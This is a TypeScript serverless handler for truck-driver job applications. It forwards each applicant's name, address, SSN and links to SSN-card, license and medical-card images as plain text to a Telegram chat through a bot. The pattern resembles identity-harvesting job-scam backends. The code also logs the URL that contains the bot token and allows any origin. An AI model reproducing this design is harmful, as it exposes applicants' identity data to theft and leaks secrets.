const TELEGRAM_API = 'https://api.telegram.org/bot';

function jsonResponse(data: object, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: {
      'Content-Type': 'application/json',
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET,POST,OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    },
  });
}

interface ApplicationBody {
  position?: string;
  name?: string;
  phone?: string;
  email?: string;
  address?: string;
  experience?: string;
  cdlType?: string;
  ssn?: string;
  documents?: {
    ssnImage?: string;
    licenseFront?: string;
    licenseBack?: string;
    medicalCard?: string;
    truckInspection?: string;
    enginePhoto?: string;
    underEnginePhoto?: string;
    tirePhoto?: string;
    resume?: string;
    capCard?: string;
  };
}

function buildTelegramMessage(body: ApplicationBody): string {
  const d = body.documents ?? {};
  const lines: string[] = [
    '🚀 New Driver Application',
    '',
    `Position: ${body.position ?? '—'}`,
    `Name: ${body.name ?? '—'}`,
    `Phone: ${body.phone ?? '—'}`,
    `Email: ${body.email ?? '—'}`,
    `Address: ${body.address ?? '—'}`,
    `Experience: ${body.experience ?? '—'}`,
    `CDL Type: ${body.cdlType ?? '—'}`,
    `SSN / EID: ${body.ssn ?? '—'}`,
    '',
    `Documents: 📎 ${Object.values(d).filter(Boolean).length} file(s)`,
    '',
  ];
  if (d.ssnImage) lines.push(`📎 SSN Image: ${d.ssnImage}`);
  if (d.licenseFront) lines.push(`📎 Driver License Front: ${d.licenseFront}`);
  if (d.licenseBack) lines.push(`📎 Driver License Back: ${d.licenseBack}`);
  if (d.medicalCard) lines.push(`📎 Medical Card: ${d.medicalCard}`);
  if (d.truckInspection) lines.push(`📎 Truck Inspection: ${d.truckInspection}`);
  if (d.enginePhoto) lines.push(`📎 Engine Photo: ${d.enginePhoto}`);
  if (d.underEnginePhoto) lines.push(`📎 Under Engine Photo: ${d.underEnginePhoto}`);
  if (d.tirePhoto) lines.push(`📎 Tire Photo: ${d.tirePhoto}`);
  if (d.resume) lines.push(`📎 Resume: ${d.resume}`);
  if (d.capCard) lines.push(`📎 CAP Card: ${d.capCard}`);
  return lines.join('\n');
}

export default async function handler(request: Request): Promise<Response> {
  try {
    if (request.method === 'OPTIONS') {
      return jsonResponse({}, 200);
    }
    if (request.method !== 'POST') {
      return jsonResponse({ error: 'Method not allowed' }, 405);
    }

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (!token || !chatId) {
      return jsonResponse({ error: 'Telegram not configured' }, 500);
    }

    console.log('[applications] Incoming request');

    let body: ApplicationBody;
    try {
      body = (await request.json()) as ApplicationBody;
    } catch {
      console.error('[applications] Invalid JSON body');
      return jsonResponse({ success: false, error: 'Invalid JSON body' }, 400);
    }

    const text = buildTelegramMessage(body);
    const url = `${TELEGRAM_API}${token}/sendMessage`;

    console.log('[applications] Sending Telegram request to', url);

    const controller = new AbortController();
    const timeoutId = setTimeout(() => {
      controller.abort();
    }, 5000);

    let res: Response;
    try {
      res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        disable_web_page_preview: true,
        }),
        signal: controller.signal,
      });
    } catch (err) {
      clearTimeout(timeoutId);
      console.error('[applications] Telegram fetch failed:', err);
      return jsonResponse(
        {
          success: false,
          error:
            err instanceof Error && err.name === 'AbortError'
              ? 'Telegram request timed out'
              : 'Telegram request failed',
        },
        502,
      );
    } finally {
      clearTimeout(timeoutId);
    }

    if (!res.ok) {
      const err = await res.text();
      console.error('[applications] Telegram error:', res.status, err);
      return jsonResponse(
        { success: false, error: 'Failed to send notification', details: err },
        502
      );
    }

    console.log('[applications] Telegram request succeeded');
    return jsonResponse({ success: true });
  } catch (err) {
    console.error('[applications] Unexpected error:', err);
    return jsonResponse(
      {
        success: false,
        error: err instanceof Error ? err.message : 'Submission failed',
      },
      500
    );
  }
}
